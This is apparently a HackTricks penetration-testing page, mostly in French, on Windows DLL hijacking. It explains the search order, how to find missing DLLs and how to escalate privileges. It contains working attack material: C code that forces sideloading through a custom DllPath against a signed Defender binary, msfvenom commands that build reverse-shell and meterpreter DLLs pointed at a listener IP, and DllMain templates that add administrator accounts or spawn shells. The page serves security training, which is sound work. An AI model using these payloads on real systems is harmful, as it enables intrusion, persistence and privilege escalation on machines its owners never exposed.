# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Informations de base

DLL Hijacking consiste à manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour code execution, obtenir persistence et, moins fréquemment, privilege escalation. Malgré l'accent mis sur l'escalade ici, la méthode de hijacking reste la même quel que soit l'objectif.

### Techniques courantes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune ayant son efficacité selon la stratégie de chargement de DLL de l'application :

1. **DLL Replacement**: Remplacer une DLL légitime par une malveillante, éventuellement en utilisant DLL Proxying pour préserver le fonctionnement de la DLL originale.
2. **DLL Search Order Hijacking**: Placer la DLL malveillante dans un chemin de recherche qui sera consulté avant celui contenant la DLL légitime, en profitant du schéma de recherche de l'application.
3. **Phantom DLL Hijacking**: Créer une DLL malveillante qu'une application va charger en croyant qu'il s'agit d'une DLL requise inexistante.
4. **DLL Redirection**: Modifier des paramètres de recherche comme `%PATH%` ou les fichiers `.exe.manifest` / `.exe.local` pour diriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement**: Substituer la DLL légitime par une version malveillante dans le répertoire WinSxS, méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking**: Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, similaire aux techniques de Binary Proxy Execution.

## Trouver des DLL manquantes

La manière la plus courante de trouver des DLL manquantes sur un système est d'exécuter [procmon] depuis sysinternals, en **configurant** les **2 filtres suivants** :

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

et n'afficher que la **File System Activity** :

![](<../../images/image (314).png>)

Si vous recherchez des DLL manquantes en général, laissez ceci tourner pendant quelques secondes.  
Si vous recherchez une DLL manquante dans un exécutable spécifique, vous devez définir un autre filtre comme "Process Name" "contains" "\<exec name>", exécuter l'exécutable, puis arrêter la capture des événements.

## Exploiter des DLL manquantes

Pour escalader les privilèges, la meilleure opportunité est de pouvoir **écrire une DLL qu'un processus privilégié tentera de charger** dans un des **emplacements où elle sera recherchée**. Ainsi, on peut **écrire** une DLL dans un **dossier** où la **DLL est recherchée avant** le dossier contenant la **DLL originale** (cas particulier), ou écrire dans un dossier où la DLL sera recherchée alors que la DLL originale n'existe dans aucun dossier.

### Dll Search Order

**Inside the** [**Microsoft documentation**] you can find how the Dlls are loaded specifically.

Les applications Windows recherchent les DLL en suivant un ensemble de chemins de recherche prédéfinis, selon une séquence particulière. Le problème du DLL hijacking survient lorsqu'une DLL malveillante est placée stratégiquement dans l'un de ces répertoires de sorte qu'elle soit chargée avant la DLL authentique. Une solution pour prévenir cela est de faire en sorte que l'application utilise des chemins absolus lorsqu'elle référence les DLL dont elle a besoin.

Vous pouvez voir l'**ordre de recherche des DLL sur les systèmes 32-bit** ci-dessous :

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ceci est l'ordre de recherche **par défaut** avec SafeDllSearchMode activé. Lorsqu'il est désactivé, le répertoire courant passe à la deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** et réglez-la sur 0 (la valeur par défaut est activée).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** est en train de charger.

Enfin, notez qu'une DLL peut être chargée en indiquant le chemin absolu plutôt que juste le nom. Dans ce cas, cette DLL ne sera recherchée que dans ce chemin (si la DLL a des dépendances, elles seront recherchées comme si elles avaient été chargées par nom).

Il existe d'autres moyens d'altérer l'ordre de recherche mais je ne vais pas les expliquer ici.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un moyen avancé pour influencer de façon déterministe le chemin de recherche des DLL d'un processus nouvellement créé est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les APIs natives de ntdll. En fournissant un répertoire contrôlé par l'attaquant ici, un processus cible qui résout une DLL importée par nom (sans chemin absolu et sans utiliser les flags de chargement sécurisés) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Idée clé
- Construire les paramètres du processus avec RtlCreateProcessParametersEx et fournir un DllPath personnalisé pointant vers votre dossier contrôlé (par ex. le répertoire où se trouve votre dropper/unpacker).
- Créer le processus avec RtlCreateUserProcess. Quand le binaire cible résout une DLL par nom, le loader consultera ce DllPath fourni pendant la résolution, permettant un sideloading fiable même lorsque la DLL malveillante n'est pas colocée avec l'EXE cible.

Remarques/limitations
- Cela affecte le processus enfant en cours de création ; c'est différent de SetDllDirectory qui n'affecte que le processus courant.
- La cible doit importer ou appeler LoadLibrary sur une DLL par nom (pas de chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et les chemins absolus codés en dur ne peuvent pas être détournés. Les exports forwardés et SxS peuvent modifier la précédence.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Lorsqu'une **DLL qui partage son nom avec une DLL déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. À la place, il effectue une vérification de redirection et un manifeste avant de revenir par défaut à la DLL déjà en mémoire. **Dans ce scénario, le système n'effectue pas de recherche pour la DLL**.
- Dans les cas où la DLL est reconnue comme une **known DLL** pour la version actuelle de Windows, le système utilisera sa version de la known DLL, ainsi que toutes ses DLL dépendantes, **en renonçant au processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces known DLLs.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **noms de module**, indépendamment du fait que la DLL initiale ait été identifiée via un chemin complet.

### Escalating Privileges

**Requirements**:

- Identifier un processus qui fonctionne ou fonctionnera sous **des privilèges différents** (mouvement horizontal ou latéral), et qui **manque une DLL**.
- S'assurer qu'un **accès en écriture** est disponible pour n'importe quel **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l'exécutable ou un répertoire dans le system path.

Oui, les prérequis sont compliqués à trouver car **par défaut il est plutôt étrange de trouver un exécutable privilégié auquel il manque une dll** et il est encore **plus étrange d'avoir des permissions d'écriture sur un dossier du system path** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, c'est possible.\
Dans le cas où vous auriez de la chance et que vous remplissiez les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si **le but principal du projet est de bypass UAC**, vous y trouverez peut-être un **PoC** d'un Dll hijaking pour la version de Windows que vous utilisez (probablement en changeant juste le chemin du dossier où vous avez des permissions d'écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec :
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet expliquant comment **abuser de Dll Hijacking pour escalader les privilèges** lorsque vous avez la permission d'écrire dans un **dossier du System PATH**, consultez :

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur n'importe quel dossier à l'intérieur du System PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll_.

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès sera de **créer une dll qui exporte au moins toutes les fonctions que l'exécutable importera depuis celle-ci**. Quoi qu'il en soit, notez que Dll Hijacking est utile pour [escalader du niveau d'intégrité Medium vers High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**High Integrity vers SYSTEM**](#from-high-integrity-to-system). Vous pouvez trouver un exemple de **comment créer une dll valide** dans cette étude sur dll hijacking axée sur l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
De plus, dans la **section suivante** vous pouvez trouver quelques **codes dll basiques** qui peuvent être utiles comme **modèles** ou pour créer une **dll exportant des fonctions non requises**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86 je n'ai pas vu de version x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Notez que, dans plusieurs cas, la Dll que vous compilez doit **export several functions** qui seront chargées par le victim process. Si ces functions n'existent pas, le **binary won't be able to load** them et l'**exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Références

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore déploie un nouveau malware ciblant l'Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
